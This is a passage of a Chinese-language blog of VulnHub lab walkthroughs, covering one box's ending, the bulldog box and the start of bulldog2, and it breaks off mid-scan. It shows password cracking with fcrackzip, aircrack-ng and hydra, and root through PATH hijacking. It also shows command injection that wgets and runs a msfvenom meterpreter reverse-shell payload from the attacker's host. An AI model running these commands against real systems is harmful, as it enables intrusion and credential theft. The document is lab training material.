<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;192.168.31.185&#x2F;smb -U smb</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">    .                                   D        0  Mon Nov  4 06:50:37 2019</span><br><span class="line">    ..                                  D        0  Mon Nov  4 06:37:28 2019</span><br><span class="line">    main.txt                            N       10  Mon Nov  4 06:45:38 2019</span><br><span class="line">    safe.zip                            N  3424907  Mon Nov  4 06:50:37 2019</span><br><span class="line">    </span><br><span class="line">                9204224 blocks of size 1024. 6824568 blocks available</span><br></pre></td></tr></table></figure>
<p>下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get main.txt</span><br><span class="line">get safe.zip</span><br></pre></td></tr></table></figure>
<p><code>main.txt</code>中没有有效信息<br />
<code>safe.zip</code>被加密<br />
使用<code>fcrackzip</code>进行爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt safe.zip</span><br><span class="line"></span><br><span class="line">    PASSWORD FOUND!!!!: pw &#x3D;&#x3D; hacker1</span><br></pre></td></tr></table></figure>
<p>解压压缩包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip safe.zip</span><br><span class="line">hacker1</span><br></pre></td></tr></table></figure>
<p>得到两个文件</p>
<ul>
<li><code>secret.jpg</code> 有文字–“AFTER THE WALKOUT”，暂时不考虑图片隐写等其他因素</li>
<li><code>user.cap</code> WireShare打开之后是IEEE 802.11协议(WIFI)的流量包，可能存在握手包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt user.cap</span><br><span class="line"></span><br><span class="line">Opening user.cap please wait...</span><br><span class="line">Read 49683 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  56:DC:1D:19:52:BC  blackjax                  WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening user.cap please wait...</span><br><span class="line">Read 49683 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                              Aircrack-ng 1.5.2 </span><br><span class="line"></span><br><span class="line">      [00:00:07] 21280&#x2F;7120712 keys tested (2885.36 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: 41 minutes, 0 seconds                           0.30%</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ snowflake ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 80 0A BE 28 5A 50 78 10 7E E2 85 A8 E8 D0 41 3C </span><br><span class="line">                       5E CB 18 C2 40 05 D7 7F E1 12 E6 B4 C6 D8 F4 E5 </span><br><span class="line"></span><br><span class="line">      Transient Key  : C8 9D B1 E2 76 82 F3 90 AC 53 CB 02 8F D0 73 FB </span><br><span class="line">                       47 92 63 63 56 97 1C 19 36 BD FD B4 D5 6D 65 35 </span><br><span class="line">                       48 1B D3 06 57 40 4D 77 9D BD 26 30 1B B3 06 AF </span><br><span class="line">                       1B FA 37 7E E8 9C 17 07 BE 63 DD C0 11 D4 88 21 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 68 98 0E 18 F9 DA 55 3B 4B BC EA 35 37 CC 25 2F</span><br></pre></td></tr></table></figure>
<p>SSID为<code>blackjax</code>，密码为<code>snowflake</code></p>
<p>在WireShark中调试<br />
Preference -&gt; Protocols -&gt; IEEE 802.11-&gt; Decryption keys -&gt; Edit<br />
添加Key记录<br />
<code>wpa-pwd|snowflake:blackjax</code><br />
流量包中未找到其他有效信息</p>
<p>尝试枚举SSH账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;smb\nblackjax\nsagar\nroot\nadmin\nhelo\nsnowflake&quot; &gt; test</span><br><span class="line">hydra -I -L test -P test -e ns -u ssh:&#x2F;&#x2F;192.168.31.185 -s 2525</span><br><span class="line">    [2525][ssh] host: 192.168.31.185   login: blackjax   password: snowflake</span><br></pre></td></tr></table></figure>
<p>获取账户blackjax</p>
<h2 id="权限提升-5"><a class="markdownIt-Anchor" href="#权限提升-5"></a> 权限提升</h2>
<p>登入SSH服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh blackjax@192.168.31.185 -p 2525</span><br><span class="line">snowflake</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>尝试SUID提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;netscan</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g</span><br></pre></td></tr></table></figure>
<p><code>/usr/bin/netscan</code>有些异常</p>
<p>使用<code>strings</code>命令分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">strings &#x2F;usr&#x2F;bin&#x2F;netscan </span><br><span class="line"></span><br><span class="line">&#x2F;lib&#x2F;ld-linux.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">_IO_stdin_used</span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.0</span><br><span class="line">PTRh</span><br><span class="line">QVhk</span><br><span class="line">UWVS</span><br><span class="line">t$,U</span><br><span class="line">[^_]</span><br><span class="line">netstat -antp</span><br><span class="line">;*2$&quot;(</span><br><span class="line">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609</span><br><span class="line">crtstuff.c</span><br><span class="line">__JCR_LIST__</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.7209</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">pingshell.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__JCR_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__x86.get_pc_thunk.bx</span><br><span class="line">_edata</span><br><span class="line">__data_start</span><br><span class="line">setgid@@GLIBC_2.0</span><br><span class="line">system@@GLIBC_2.0</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_start_main@@GLIBC_2.0</span><br><span class="line">__libc_csu_init</span><br><span class="line">_fp_hw</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setuid@@GLIBC_2.0</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rel.dyn</span><br><span class="line">.rel.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.jcr</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure>
<p>可以看到<code>netstat -antp</code><br />
猜想这个二进制文件是在执行netstat命令<br />
则可以进行PATH提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt;netstat</span><br><span class="line">chmod 777 netstat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;netscan</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1001(blackjax)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>PATH提权</p>
</blockquote>
<ul>
<li>目标文件为二进制可执行文件</li>
<li>需要知道目标文件所执行的命令</li>
<li>strings查看可执行文件内容</li>
</ul>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.moonsec.com/archives/709">WP</a><br />
<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/221949.html">WP</a><br />
<a target="_blank" rel="noopener" href="https://www.xuebuyuan.com/3235974.html">SMB</a><br />
<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/146799">PATH提权</a></p>
</blockquote>
<hr />
<h1 id="bulldog"><a class="markdownIt-Anchor" href="#bulldog"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bulldog-1,211/">bulldog</a></h1>
<p><code>2020/02/17 19:06:44</code></p>
<h2 id="端口扫描-6"><a class="markdownIt-Anchor" href="#端口扫描-6"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -T5 -n -v -A 192.168.31.121</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.121</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">23&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)</span><br><span class="line">|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)</span><br><span class="line">|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">8080&#x2F;tcp open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">MAC Address: 08:00:27:33:65:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.003 days (since Sun Feb 16 21:45:10 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;257 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-6"><a class="markdownIt-Anchor" href="#web路径枚举-6"></a> Web路径枚举</h2>
<p>尝试爆破80端口下的Web路径</p>
<p><code>dirb http://192.168.31.121/</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;admin&#x2F;                                                  </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.121&#x2F;robots.txt (CODE:200|SIZE:1071)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;shell&#x2F; ----</span><br></pre></td></tr></table></figure>
<p>尝试爆破8080端口下的Web路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;admin&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;robots.txt (CODE:200|SIZE:1071)</span><br><span class="line">                                                    </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;shell&#x2F; ----</span><br></pre></td></tr></table></figure>
<p>80端口与8080端口上的WEB服务的路径几乎一样，极可能是同一个站点。<br />
访问两个WEB服务之后发现并无差别，先对80端口进行渗透。</p>
<h2 id="漏洞利用-6"><a class="markdownIt-Anchor" href="#漏洞利用-6"></a> 漏洞利用</h2>
<p>访问路径<code>/admin/</code>跳转至登录界面<br />
简单尝试弱口令后无效</p>
<p>访问路径<code>/dev/shell/</code>时提示 <strong>&quot;Please authenticate with the server to use Web-Shell&quot;</strong><br />
猜测需要在之前的登录界面中登入后才能访问</p>
<p>访问路径<code>/dev/</code>与<code>/</code>时发现一些人名<br />
制作简易字典</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">Winston Churchy</span><br><span class="line">Bulldog Industries</span><br><span class="line">Alan Brooke</span><br><span class="line">alan@bulldogindustries.com</span><br><span class="line">william@bulldogindustries.com</span><br><span class="line">malik@bulldogindustries.com</span><br><span class="line">kevin@bulldogindustries.com</span><br><span class="line">ashley@bulldogindustries.com</span><br><span class="line">nick@bulldogindustries.com</span><br><span class="line">sarah@bulldogindustries.com</span><br><span class="line">admin@bulldogindustries.com</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">Sarah</span><br><span class="line">sarah</span><br><span class="line">Nick</span><br><span class="line">nick</span><br><span class="line">Ashley</span><br><span class="line">ashley</span><br><span class="line">Kevin</span><br><span class="line">kevin</span><br><span class="line">Malik</span><br><span class="line">malik</span><br><span class="line">William</span><br><span class="line">william</span><br><span class="line">Alan</span><br><span class="line">alan</span><br><span class="line">Brooke</span><br><span class="line">brooke</span><br><span class="line">Bulldog</span><br><span class="line">bulldog</span><br><span class="line">Industries</span><br><span class="line">industries</span><br><span class="line">Winston</span><br><span class="line">winston</span><br><span class="line">Churchy</span><br><span class="line">churchy</span><br></pre></td></tr></table></figure>
<p>使用burpsuite进行账户爆破<br />
得到账户<code>nick:bulldog</code></p>
<p>登入之后得到提示<code>You don't have permission to edit anything.</code></p>
<p>此时再访问<code>/dev/shell/</code><br />
WEB端执行系统命令 -&gt; 命令注入<br />
简单尝试之后发现<code>ls|cat /etc/passwd</code>可以执行</p>
<p>但是这个WEB是基于python的Django架构，不存在写入一句话木马的方法。<br />
大概有两种方法：</p>
<ul>
<li>nc连接(正向连接/反弹Shell)</li>
<li>wget下载后门程序</li>
</ul>
<p><strong>第一种方法</strong><br />
直接返回500<br />
pass</p>
<p><strong>第二种方法</strong><br />
生成后门文件&amp;启动HTTP服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 &gt; shell.py</span><br><span class="line">python -m SimpleHTTPServer 80 &amp;</span><br></pre></td></tr></table></figure>
<p>MSF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>命令注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls|wget http:&#x2F;&#x2F;192.168.31.10&#x2F;shell.py</span><br><span class="line">ls|python shell.py</span><br></pre></td></tr></table></figure>
<p>在MSF中接收到Shell</p>
<h2 id="权限提升-6"><a class="markdownIt-Anchor" href="#权限提升-6"></a> 权限提升</h2>
<p>获取tty</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>在路径<code>/home/bulldogadmin/</code>下发现隐藏路径<code>.hiddenadmindirectory</code></p>
<p>进入之后发现两个文件<code>note</code>，<code>customPermissionApp</code></p>
<p>先将两个文件复制至自己home目录下并更改权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp * &#x2F;home&#x2F;django&#x2F;</span><br><span class="line">chmod 700 note customPermissionApp</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat note </span><br><span class="line"></span><br><span class="line">Nick,</span><br><span class="line"></span><br><span class="line">I&#39;m working on the backend permission stuff. Listen, it&#39;s super prototype but I think it&#39;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! </span><br><span class="line"></span><br><span class="line">It&#39;s great stuff! Once I&#39;m finished with it, a hacker wouldn&#39;t even be able to reverse it! Keep in mind that it&#39;s still a prototype right now. I am about to get it working with the Django user account. I&#39;m not sure how I&#39;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?</span><br><span class="line"></span><br><span class="line">Let me know what you think of it!</span><br><span class="line"></span><br><span class="line">-Ashley</span><br></pre></td></tr></table></figure>
<p>另外一个文件是elf文件，大概对于提权有帮助<br />
直接执行则提示需要输入自己的密码，大概在执行<code>sudo su</code></p>
<p>用strings命令分析一下内容<br />
看到一串有意思的字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SUPERultH</span><br><span class="line">imatePASH</span><br><span class="line">SWORDyouH</span><br><span class="line">CANTget</span><br></pre></td></tr></table></figure>
<p>可以猜测密码是<code>SUPERultHimatePASHSWORDyouHCANTget</code><br />
或<code>SUPERultimatePASSWORDyouCANTget</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">SUPERultimatePASSWORDyouCANTget</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yufusec/p/9179625.html">Burp.Intruder</a></p>
</blockquote>
<hr />
<h1 id="bulldog2"><a class="markdownIt-Anchor" href="#bulldog2"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bulldog-2,246/">bulldog2</a></h1>
<p><code>2020/02/20 16:35:33</code></p>
<h2 id="端口扫描-7"><a class="markdownIt-Anchor" href="#端口扫描-7"></a> 端口扫描</h2>
<p><code>nmap -sV -p 1-65535 -T 5 -n -A -v 192.168.31.233</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.233</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65534 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-cors: HEAD GET POST PUT DELETE PATCH</span><br><span class="line">|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F</span><br><span class="line">| 